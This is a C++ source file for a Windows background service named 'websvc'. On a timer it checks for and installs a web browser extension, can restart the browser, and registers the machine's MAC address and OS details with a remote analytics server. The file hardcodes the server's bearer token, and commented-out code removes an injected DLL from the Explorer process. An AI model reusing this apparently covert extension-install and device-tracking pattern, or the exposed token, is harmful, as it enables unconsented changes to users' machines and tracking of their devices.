// mi_id_svc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <windows.h>
#include <iostream>
#include <winsvc.h>
#include <wtypes.h>
#include <stdio.h>
#include <tchar.h>
#include <sddl.h>
#include "ZipUtil.h"
#include "ProcessUtil.h"
#include "NetUtil.h"
#include "MyDefine.h"
#include "json.hpp"

using namespace std;

#define		GD_SVC_NAME				L"websvc"
#define		GD_MAX_SYN_MIN_TIME		(1000 * 60)


SERVICE_STATUS_HANDLE lv_hServiceStatus;
HANDLE lv_thdService = NULL;
BOOL	lv_ProcStop = FALSE;


void RunService();

// Service control handler function
DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:
//		OutputDebugStringA("-------- SERVICE_CONTROL_STOP");

		lv_ProcStop = TRUE;
		Sleep(1000);

		if (lv_thdService != NULL) {
			TerminateThread(lv_thdService, 0);
			lv_thdService = NULL;
		}

		SERVICE_STATUS serviceStatus;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(lv_hServiceStatus, &serviceStatus);
		break;

	default:
		break;
	}

	return NO_ERROR;
}

unsigned long startService(const wchar_t* p_wszName)
{
	unsigned long lRet = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};

	// Open the local default service control manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL)
	{
//		wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	// Open the service with delete, stop, and query status permissions
	schService = OpenService(schSCManager, p_wszName, SERVICE_START);
	if (schService == NULL)
	{
//		wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	if (StartService(schService, 0, NULL) == false) {
//		wprintf(L"StartService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
	return lRet;
}
#define SERVER_DOMAIN L"dash.zintrack.com"
#define REG_PATH L"/api/v1/register"
#define SEND_EVENT L"/api/v1/events/install"
#define BEARER_TOKEN L"40|xSYEfJuEfwHwFm8ccglYY4fxpXYJTpqTqT3Rvr1W5640aab2"

wstring _serverDomain = SERVER_DOMAIN;
wstring _bearerToken = BEARER_TOKEN;

wstring RegisterMachine()
{
	nlohmann::json jsonData;
	jsonData["type"] = "WindowsApplication";
	jsonData["deviceId"] = GetMACAddress();
	jsonData["osVersion"] = GetOSVersion();
	jsonData["app"] = GetProcessName();
	wstring response;
	BOOL ret = HTTPSPost(_serverDomain, REG_PATH, jsonData.dump(), response, _bearerToken);
	if (!ret)
	{
		return L"";
	}

	nlohmann::json jsonRet = nlohmann::json::parse(ConvertWStringToString(response));

	string w_stemp = jsonRet["id"];
	return charToWstring(w_stemp.c_str());
}

//.
unsigned int TF_THREAD(void*) {
	
	TCHAR				w_szParam[MAX_PATH] = L"";
	INSTALLER_INFO      w_stINSTALLER_INFO; memset(&w_stINSTALLER_INFO, 0x00, sizeof(INSTALLER_INFO));
	std::string			w_sServerAddr = "";
	bool				w_bRealInstall = false;
	bool				w_bAnalytics = false;
	int					i = 0;

	MyWriteLog_Web("WebSvc ... TF_THREAD Start");


	FILE* w_pFileInfo = fopen(GD_LOCAL_WEB_SET_FILEPATH, "rb");
	if (w_pFileInfo != NULL) {
		fread(&w_stINSTALLER_INFO, 1, sizeof(INSTALLER_INFO), w_pFileInfo);
		fclose(w_pFileInfo);
	}
	w_sServerAddr = w_stINSTALLER_INFO.m_szWebServerIPAddr;
	if (w_sServerAddr.size() < 3) {
		w_sServerAddr = "";
	}
	//.
	_serverDomain = charToWstring(w_stINSTALLER_INFO.m_szAnalyticsServer);
	_bearerToken = charToWstring(w_stINSTALLER_INFO.m_szAnalyticsToken);
	if (_serverDomain.size() > 0 && _bearerToken.size() > 0) {
		w_bAnalytics = true;
	}
	if (w_stINSTALLER_INFO.m_nPingIntervalTime <= 0) {
		w_stINSTALLER_INFO.m_nPingIntervalTime = GD_DEFAULT_PING_TIME * GD_MAX_SYN_MIN_TIME;
	}
	else {
		w_stINSTALLER_INFO.m_nPingIntervalTime = w_stINSTALLER_INFO.m_nPingIntervalTime * GD_MAX_SYN_MIN_TIME;
	}


	//.
	while (lv_ProcStop == FALSE) {

		for (i = 0; i < w_stINSTALLER_INFO.m_nPingIntervalTime / 1000; i++) {
			Sleep(1000);
			if (lv_ProcStop == TRUE) {
				break;
			}
		}
		
		//
		w_bRealInstall = false;
		CheckWebExtensionAndInstall(w_sServerAddr, w_bRealInstall, w_stINSTALLER_INFO.m_nRestartBrowser);


		if (w_bRealInstall == true) {
			MyWriteLog_Web("WebSvc ... CheckWebExtensionAndInstall w_bRealInstall == true");
		}

		//.
		std::string		w_sUUID = "";
		std::string		w_sAppName = "";
		GetAppNameAndUUIDInfo(GD_LOCAL_WEB_INFO_FILEPATH, w_sAppName, w_sUUID);
		if (w_sUUID.empty() && w_sAppName.size() > 0 && w_bAnalytics == true) {

			MyWriteLog_Web("WebSvc ... RegisterMachine Start");
			//. 
			wstring uuid = RegisterMachine();
			if (uuid.empty() == false) {
				w_sUUID = ConvertWStringToString(uuid);
				string		w_sPingPath = PING_API_ADDR + w_sUUID;
				string		w_sResponse = "";

				MyWriteLog_Web("WebSvc ... RegisterMachine w_sUUID = %s", w_sUUID.c_str());
				SetAppNameAndUUIDInfo(GD_LOCAL_WEB_INFO_FILEPATH, w_sAppName, w_sUUID);
				HTTPSGet(ConvertWStringToString(_serverDomain), w_sPingPath, w_sResponse, ConvertWStringToString(_bearerToken));
			}

		}
		else if (w_sUUID.size() > 0 && w_sAppName.size() > 0 && w_bAnalytics == true) {

			string		w_sPingPath = PING_API_ADDR + w_sUUID;
			string		w_sResponse = "";

			MyWriteLog_Web("WebSvc ... Ping w_sUUID = %s", w_sUUID.c_str());
			HTTPSGet(ConvertWStringToString(_serverDomain), w_sPingPath, w_sResponse, ConvertWStringToString(_bearerToken));
		}
	}

	return 0;
}

//.
void RunService() {
	
	DWORD dwTID;

	lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
	WaitForSingleObject(lv_thdService, INFINITE);
}

//.
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
//	OutputDebugStringA("SfT - Service Main\n");

	lv_ProcStop = FALSE;

	// Register service control handler
	lv_hServiceStatus = RegisterServiceCtrlHandlerEx(GD_SVC_NAME, ServiceCtrlHandlerEx, NULL);
	if (!lv_hServiceStatus) {
		return;
	}

	// Notify service controller that the service is starting
	SERVICE_STATUS serviceStatus;
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	// Perform initialization tasks here

	// Notify service controller that the service is running
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

//	OutputDebugStringA("ServiceMain -- Start");

	while (lv_ProcStop == FALSE) {
		// Run the service
		RunService();
		Sleep(1000);
	}
	//if (lv_dwProcess_Explorer != 0) {
	//	UninjectDLL(lv_dwProcess_Explorer, "ntdb.dll");
	//	lv_dwProcess_Explorer = 0;
	//}

	// Notify service controller that the service has stopped
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);
}

int main() 
	{
//		OutputDebugStringA("SfT---Start");
		wchar_t p[] = GD_SVC_NAME;

		SERVICE_TABLE_ENTRYW ServiceTable[] =
		{
			{ (LPWSTR)GD_SVC_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
			{ NULL, NULL }
		};

		// Start the service control dispatcher
		if (!StartServiceCtrlDispatcher(ServiceTable)) {
			//		std::cerr << "Failed to start service control dispatcher\n";
//			OutputDebugStringA("SfT---exit");
			return GetLastError();
		}
		return 0;
	}
